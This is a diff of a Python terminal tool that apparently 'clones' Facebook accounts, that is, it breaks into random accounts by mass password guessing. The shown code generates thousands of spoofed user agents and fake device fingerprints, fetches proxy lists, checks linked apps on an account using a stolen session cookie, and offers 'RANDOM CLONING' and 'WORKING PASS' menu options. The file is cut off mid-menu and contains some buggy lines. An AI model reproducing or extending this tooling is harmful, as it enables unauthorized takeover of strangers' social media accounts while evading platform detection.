@@ -1,1602 +1,233 @@
-fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
-
+#-------------------[ MAIN-CODE ]-------------------#
+from os import path
+import os,base64,zlib,pip,urllib
 try:
-	import os,requests,json,time,re,random,sys,uuid,string,subprocess
-	from string import *
-	import bs4
-	#import dz
-	from concurrent.futures import ThreadPoolExecutor as tred
-	from bs4 import BeautifulSoup as sop
-	from bs4 import BeautifulSoup
-except ModuleNotFoundError: 
-	print('\n Installing missing modules ...')
-	os.system('pip install requests bs4 futures==2 > /dev/null')
-	os.system('python trt.py')
-	
-print('[â€¢] Join Our Group')
-os.system('xdg-open https://https://facebook.com/profile.php?id=61554443546139')
-
-try:
-	prox= requests.get('https://github.com/shipukhan2001/Sk_Shipu/blob/main/Sk_Shipu.txt').text
-	open('proxies.txt','w').write(proxies)
-except Exception as e:
-	print('\x1b[1;95m[âˆš] LOADING...')
-	
-proxies=open('proxies.txt','r').read().splitlines()
-
-
-android_models=[]
-try:
-	xx = requests.get('https://github.com/shipukhan2001/Sk_Shipu/blob/main/Sk_Shipu.txt').text.splitlines()
-	for line in xx:
-		android_models.append(line)
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        os.system('pip install requests futures==2 > /dev/null')
 except:pass
-
-usr=[]
-try:
-	xd=requests.get('https://github.com/shipukhan2001/Sk_Shipu/blob/main/Sk_Shipu.txt').text.splitlines()
-	for us in xd:
-		usr.append(us)
-except: pass
-
-gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
-ugen=[]
-for xd in range(10000):
-	aa='Mozilla/5.0 (Linux; U; Android'
-	b=random.choice(['6','7','8','9','10','11','12','13'])
-	c=f' en-us; {str(gt)}'
-	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	h=random.randrange(73,100)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='Mobile Safari/537.36'
-	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
-	ugen.append(uaku2)
-for agent in range(10000):
-	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
-	b=random.choice(['6','7','8','9','10','11','12','13'])
-	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.randrange(1, 999)
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
-	h=random.randrange(73,100)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='Mobile Safari/533.1'
-	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-	ugen.append(fullagnt)
-rug=[]
-for nt in range(10000):
-	rr=random.randint
-	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	rx=random.randrange(1, 999)
-	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
-	rug.append(xx)
-ruz=[]
-for mtc in range(10000):
-	rr=random.randint
-	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
-	ruz.append(xd)
-	
-#new ua
-ugen=[]
-for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
-        b=random.choice(['6','7','8','9','10','11','12'])
-        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
-        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
-        h=random.randrange(73,100)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile Safari/533.1'
-        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-        ugen.append(fullagnt)
-
-sim_id = ''
-android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
-model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
-build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
-fblc = 'en_GB'
-try:
-        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
-except:
-        fbcr = 'Zong'
-fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
-fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
-fbdv = model
-fbsv = android_version
-fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
-fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
-try:
-        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
-        total = 0
-        for i in fbcr:
-                total+=1
-        select = ('1','2')
-        if select == '1':
-                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
-                sim_id+=fbcr
-        elif select == '2':
-                try:
-                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
-                        sim_id+=fbcr
-                except Exception as e:
-                        fbcr = "Zong"
-                        sim_id+=fbcr
-        else:
-                fbcr = 'Zong'
-                sim_id+=fbcr
-except:
-        fbcr = "Zong"
-device = {
-        'android_version':android_version,
-        'model':model,
-        'build':build,
-        'fblc':fblc,
-        'fbmf':fbmf,
-        'fbbd':fbbd,
-        'fbdv':model,
-        'fbsv':fbsv,
-        'fbca':fbca,
-        'fbdm':fbdm}
-
-logo=("""\033[1;91m
-                                                                                                                                                                                                                                                                                                                                                       
-  
-..######..##....##....##.....##....###....##.....##.##.....##.##.....##.########.
-.##....##.##...##.....###...###...##.##...##.....##.###...###.##.....##.##.....##
-.##.......##..##......####.####..##...##..##.....##.####.####.##.....##.##.....##
-..######..#####.......##.###.##.##.....##.#########.##.###.##.##.....##.##.....##
-.......##.##..##......##.....##.#########.##.....##.##.....##.##.....##.##.....##
-.##....##.##...##.....##.....##.##.....##.##.....##.##.....##.##.....##.##.....##
-..######..##....##....##.....##.##.....##.##.....##.##.....##..#######..########.
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
-\033[1;37m--------------------------------------------------
-[~] Author   : Sk Mahmud
-[~] Facebook : Sk Mahmud 
-[~] Tool     : Free
-[~] Version  : 0.1
-\033[1;37m----------------------------------------------""")
-def linex():
-	print('\033[1;37m----------------------------------------------')
-def clear():
-	os.system('clear')
-	print(logo)
-A = '\x1b[1;97m' 
-B = '\x1b[1;96m' 
-C = '\x1b[1;91m' 
-D = '\x1b[1;92m'
-M = '\033[1;31m'
-H = '\033[1;32m'
-N = '\x1b[1;37m'	
-E = '\x1b[1;93m' 
-F = '\x1b[1;94m'
-G = '\x1b[1;95m'
-P = '\033[1;37m'
-def cek_apk(session,coki):
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f'\r%s [%sâ€¢%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
-	else:
-		print(f'\r{A} [â€¢]%s Active Apks & Web ðŸ‘‡ '%(H))
-		for i in range(len(game)):
-			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f'\r%s [%sâ€¢%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
-	else:
-		print(f'\r{A} [â€¢]%s Expired Apks & Web ðŸ‘‡ '%(M))
-		for i in range(len(game)):
-			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
+#-----------------------[ COLOR-CODE ]-----------------------#
+pwx=[]
+W = '\033[97;1m'
+R = '\033[91;1m'
+G = '\033[92;1m'
+Y = '\033[93;1m'
+B = '\033[94;1m'
+P = '\033[95;1m'
+S = '\033[96;1m'
+N = '\x1b[0m'
+PURPLE ='\x1b[38;5;46m'
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m'
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+BLACK="\033[1;37m"
+EXTRA ='\x1b[38;5;208m'
+bblack="\033[1;37m" 
+M="\033[1;31m"       
+H="\033[1;33m"               
+byellow="\033[1;33m"     
+bblue="\033[1;34m"        
+P="\033[1;35m"               
+C="\033[1;36m"          
+B="\033[1;37m"       
+G="\033[1;32m"              
+R="\033[1;31m"
+AA="\033[1;32m"
+BB="\033[1;31m"
+CC="\033[1;36m"
+X='\033[1;30m'
+XX="\x1b[38;5;196m"
+LA="\x1b[38;5;10m"
+LJ="\x1b[38;5;46m"
+LX="\x1b[1;97m"
+LG="\x1b[38;5;46m"
+GGG="\x1b[38;5;214m"
+LM="≛"
+SEX="\x1b[38;5;223m"
+#-----------------------[ COUNT-CODE ]-----------------------#
 loop=0
-oks=[]
-cps=[]
+ok=[]
+cp=[]
+user=[]
+ugen=[]
+plist=[]
 pcp=[]
-id=[]
-tokenku=[]
+tanim=[]
+xxxgtxxx = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750','TECNO LD7','DMP-A6','T95MAX','Mi MIX 2S','CPH2525','K2501','i-925','Infinix X670','i99','Teracube_2e','oppen','VIVO Y33S','Redmi S2','PRIMO ZX4','Pixel 5','Smooth 5.5 MAX','SM-G930F','LM-G910N','TECNO CH6i','Pixel 7','T5 Max','Redmi Note 4','i18','Redmi Note 8','Primo R10','SM-S908B'])
+for ua in range(10000):
+    ua1='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randint(100,120))+'.0.0.0 Safari/537.36'
+    ua2='Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randint(100,120))+'.0.0.0 Safari/537.36'
+    ua3='Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randint(100,120))+'.0.0.0 Safari/537.36'
+    ua4='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randint(100,120))+'.0.0.0 Safari/537.36'
+    ua5='Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/'+str(random.randint(92,120))+'.0.'+str(random.randint(5200,6100))+'.'+str(random.randint(100,199))+' Mobile/15E148 Safari/604.1'
+    ua6='Mozilla/5.0 (Linux; Android '+str(random.randint(4,13))+') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randint(92,120))+'.0.'+str(random.randint(5200,6100))+'.'+str(random.randint(100,199))+' Mobile Safari/537.36'
+    ua7='Mozilla/5.0 (Linux; Android '+str(random.randint(4,13))+'; '+xxxgtxxx+') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randint(92,120))+'.0.'+str(random.randint(5200,6100))+'.'+str(random.randint(100,199))+' Mobile Safari/537.36'
+    uax=random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7])
+    ugen.append(uax)
+#-----------------------[ LOGO-CODE ]-----------------------#
+logo = (f""" \x1b[38;5;46m██████ \x1b[38;5;47m ██     \x1b[38;5;48m  █████ \x1b[38;5;49m  ██████\x1b[38;5;86m ██   ██ \n \x1b[38;5;46m██   ██\x1b[38;5;47m ██     \x1b[38;5;48m ██   ██\x1b[38;5;49m ██     \x1b[38;5;86m ██  ██  \n \x1b[38;5;46m██████ \x1b[38;5;47m ██     \x1b[38;5;48m ███████\x1b[38;5;49m ██     \x1b[38;5;86m █████    \n \x1b[38;5;46m██   ██\x1b[38;5;47m ██     \x1b[38;5;48m ██   ██\x1b[38;5;49m ██     \x1b[38;5;86m ██  ██   \n \x1b[38;5;46m██████ \x1b[38;5;47m ███████\x1b[38;5;48m ██   ██\x1b[38;5;49m  ██████\x1b[38;5;86m ██   ██\n\x1b[38;5;223m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\033[1;37m\033[37;41m   TOOLS : BD INDIA PAK NEPAL WORKING    \033[0;m\n\x1b[38;5;223m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;223m┳━━━━━━┓\n \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] AUTHOR   : MD MORSHED       \x1b[38;5;223m┃ \033[1;32mMTTM \x1b[38;5;223m┃\n \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] FACEBOOK : MD MORSHED       \x1b[38;5;223m┗━━━━━━┛\n \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] GITHUB   : MORSHED-404      \x1b[38;5;223m┏━━━━━━┓     \n \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] TOOLS    : PREMIUM          \x1b[38;5;223m┃  \033[1;32mV4\x1b[38;5;223m  ┃   \n\x1b[38;5;223m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━┛""")
+logo2 = (f""" \x1b[38;5;46m██████ \x1b[38;5;47m ██     \x1b[38;5;48m  █████ \x1b[38;5;49m  ██████\x1b[38;5;86m ██   ██ \n \x1b[38;5;46m██   ██\x1b[38;5;47m ██     \x1b[38;5;48m ██   ██\x1b[38;5;49m ██     \x1b[38;5;86m ██  ██  \n \x1b[38;5;46m██████ \x1b[38;5;47m ██     \x1b[38;5;48m ███████\x1b[38;5;49m ██     \x1b[38;5;86m █████    \n \x1b[38;5;46m██   ██\x1b[38;5;47m ██     \x1b[38;5;48m ██   ██\x1b[38;5;49m ██     \x1b[38;5;86m ██  ██   \n \x1b[38;5;46m██████ \x1b[38;5;47m ███████\x1b[38;5;48m ██   ██\x1b[38;5;49m  ██████\x1b[38;5;86m ██   ██\n\x1b[38;5;223m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\033[1;37m\033[37;41m   TOOLS : BD INDIA PAK NEPAL WORKING    \033[0;m\n\x1b[38;5;223m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;223m┳━━━━━━┓\n \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] AUTHOR   : MD MORSHED       \x1b[38;5;223m┃ \033[1;32mRAN\x1b[38;5;223m ┃\n \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] FACEBOOK : MD MORSHED       \x1b[38;5;223m┗━━━━━━┛\n \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] GITHUB   : MORSHED-404      \x1b[38;5;223m┏━━━━━━┓     \n \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] TOOLS    : PREMIUM          \x1b[38;5;223m┃  \033[1;32mV4\x1b[38;5;223m  ┃   \n\x1b[38;5;223m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━┛""")
+def linex():
+    print(f'\x1b[38;5;223m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+def clear():
+    os.system('clear')
+    print(logo)
+def clearx():
+    os.system('clear')
+    print(logo2)
+def main():
+        clear()
+        print(" \x1b[1;92m[\x1b[1;91mA\x1b[1;92m]\x1b[1;92m[\x1b[1;91m1\x1b[1;92m] RANDOM CLONING")
+        print(" \x1b[1;92m[\x1b[1;91mB\x1b[1;92m]\x1b[1;92m[\x1b[1;91m2\x1b[1;92m] JOIN GROUP ")
+        print(" \x1b[1;92m[\x1b[1;91mC\x1b[1;92m]\x1b[1;92m[\x1b[1;91m3\x1b[1;92m] CONTACT ADMIN")
+        print(" \x1b[1;92m[\x1b[1;91mD\x1b[1;92m]\x1b[1;92m[\x1b[1;91m4\x1b[1;92m] WORKING PASS")
+        print(" \x1b[1;92m[\x1b[1;91mX\x1b[1;92m]\x1b[1;92m[\x1b[1;91m0\x1b[1;92m] \033[1;31mEXIT");linex()
+        tanim = input(f' \x1b[1;92m[\x1b[1;91m{LM}\x1b[1;92m] CHOICE MENU : ')
+        if tanim in ['1','A']:
+                country()
+        elif tanim in ['2','B']:
